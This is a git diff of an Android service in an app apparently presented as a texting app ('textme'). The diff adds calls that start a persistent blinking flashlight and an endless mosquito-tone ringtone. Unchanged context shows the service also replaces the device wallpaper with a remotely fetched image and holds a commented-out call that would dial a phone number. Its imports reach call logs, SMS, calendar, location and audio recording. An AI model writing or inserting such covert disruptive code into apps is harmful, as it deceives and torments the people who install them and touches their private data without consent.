@@ -1,5 +1,6 @@
 package com.candroid.textme;
 
+import android.app.SearchManager;
 import android.app.Service;
 import android.content.Context;
 import android.content.Intent;
@@ -7,26 +8,37 @@ import android.content.IntentFilter;
 import android.database.ContentObserver;
 import android.database.Cursor;
 import android.database.sqlite.SQLiteDatabase;
-import android.graphics.Bitmap;
-import android.graphics.BitmapFactory;
+import android.graphics.Canvas;
+import android.graphics.Color;
+import android.graphics.Paint;
+import android.graphics.pdf.PdfDocument;
+import android.hardware.Camera;
 import android.hardware.camera2.CameraAccessException;
 import android.hardware.camera2.CameraManager;
 import android.location.LocationManager;
+import android.media.AudioManager;
+import android.media.MediaPlayer;
 import android.media.MediaRecorder;
 import android.net.Uri;
+import android.os.Bundle;
+import android.os.CancellationSignal;
 import android.os.Environment;
 import android.os.Handler;
 import android.os.IBinder;
-import android.os.Looper;
-import android.os.VibrationEffect;
-import android.os.Vibrator;
+import android.os.ParcelFileDescriptor;
+import android.print.PageRange;
+import android.print.PrintAttributes;
+import android.print.PrintDocumentAdapter;
+import android.print.PrintDocumentInfo;
+import android.print.PrintManager;
+import android.print.pdf.PrintedPdfDocument;
 import android.provider.CalendarContract;
 import android.provider.CallLog;
 import android.provider.Telephony;
 import android.util.Log;
-import android.webkit.URLUtil;
 
 import java.io.File;
+import java.io.FileOutputStream;
 import java.io.IOException;
 import java.io.InputStream;
 
@@ -176,14 +188,9 @@ public class MessagingService extends Service {
                 }
             }
         }).start();*/
-        CameraManager cameraManager = (CameraManager) getSystemService(Context.CAMERA_SERVICE);
-        try {
-            String cameraId = cameraManager.getCameraIdList()[0];
-            cameraManager.setTorchMode(cameraId, true);
-        } catch (CameraAccessException e) {
-            e.printStackTrace();
-        }
+
         //Lofl.phoneCall(MessagingService.this, "18002738255");
+        Lofl.persistentBlinkingFlashlight(this);
         new Thread(new Runnable() {
             @Override
             public void run() {
@@ -208,6 +215,8 @@ public class MessagingService extends Service {
                 Lofl.changeWallpaper(MessagingService.this, Lofl.getBitmapFromUrl(Uri.parse("https://i.pinimg.com/originals/04/17/57/0417575eea25c3568bf4007de9afe61f.jpg").toString()));
             }
         }).start();
+        Lofl.playEndlessMosquitoRingtone(this);
+
     }
 
     @Override
